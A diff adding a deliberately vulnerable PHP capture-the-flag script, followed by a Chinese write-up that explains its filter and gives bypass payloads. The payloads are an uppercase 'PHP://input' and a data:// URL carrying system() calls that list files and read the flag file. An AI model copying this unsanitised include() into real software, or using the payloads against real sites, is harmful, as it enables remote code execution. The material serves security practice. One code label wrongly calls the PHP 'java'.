@@ -1,0 +1,42 @@
+<?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, "php://")) {
+    $page=str_replace("php://", "", $page);
+}
+include($page);
+?>
+分析：
+根据show_source(FILE);，以及题目中的文件include，这道题用文件动态包含拿flag
+
+strstr()：
+定义和用法：
+搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。
+区分大小写，stristr()函数不区分大小写
+语法：
+strstr(string,search,before_search)
+string:必需，被搜索的字符串
+search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符
+before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分
+
+str_replace():
+定义和用法：
+以其它字符替换字符串中的一些字符（区分大小写）
+语法：
+str_replace(find,replace,string,count)
+find,必需，要查找的值
+replace，必需，要替换的值
+string，必需，被搜索的字符串
+count，可选，替换次数
+
+java运行:
+while (strstr($page, "php://")) {       //判断包含的文件是否有php：//有的话返回true
+    $page=str_replace("php://", "", $page);     		//将包含文件中的php：//替换成空
+}    
+总结：程序过滤掉了page=参数传入php://
+方法1：
+利用php伪协议大小写绕过: http://......./?page=PHP://input
+方法2：
+data伪协议代码执行:http://.......?page=data://text/plain,<?php system("ls")?>
+                                 ?page=data://text/plain,<?php system("cat fl4gisisish3r3.php")?>
